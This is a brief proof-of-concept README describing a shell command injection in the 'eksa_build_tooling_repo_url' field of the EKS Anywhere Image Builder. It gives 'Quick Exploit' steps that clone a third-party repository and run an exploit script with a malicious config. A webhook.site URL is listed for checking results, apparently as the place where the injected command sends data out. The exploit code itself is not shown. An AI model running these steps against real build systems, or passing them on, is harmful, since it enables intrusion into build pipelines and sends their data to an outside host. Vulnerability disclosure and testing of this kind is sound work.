# EKS Anywhere Image Builder - Command Injection PoC

## Vulnerability
Shell command injection in `eksa_build_tooling_repo_url` config field.

## Quick Exploit
```bash
git clone https://github.com/helitestacc/imagebuilder.git && cd imagebuilder
./exploit.sh malicious-config.json
```

## Check Results
https://webhook.site/25ce9523-a606-4147-a549-b95795f250c9
